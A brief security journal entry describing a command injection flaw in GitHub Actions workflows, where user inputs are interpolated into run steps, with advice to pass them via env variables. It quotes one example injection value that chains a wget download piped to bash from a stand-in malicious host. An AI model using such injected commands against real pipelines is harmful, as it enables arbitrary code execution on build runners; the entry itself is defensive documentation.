## 2025-02-18 - GitHub Actions Command Injection via Context Interpolation
**Vulnerability:** Found direct string interpolation of GitHub contexts (e.g. `${{ github.event.inputs.tag }}`) inside `run` blocks in GitHub Action workflows.
**Learning:** This codebase uses `workflow_dispatch` with user inputs. If an attacker passes a malicious string like `"test; wget malicious.com/script.sh | bash"`, GitHub Actions interpolates this directly into the shell script before execution, leading to arbitrary code execution on the runner.
**Prevention:** Always pass GitHub context variables containing untrusted input (like `github.event.inputs.*`, `github.head_ref`, etc.) to the `run` step via an intermediate `env` block, and reference them as standard shell variables (e.g. `$INPUT_VAR`).
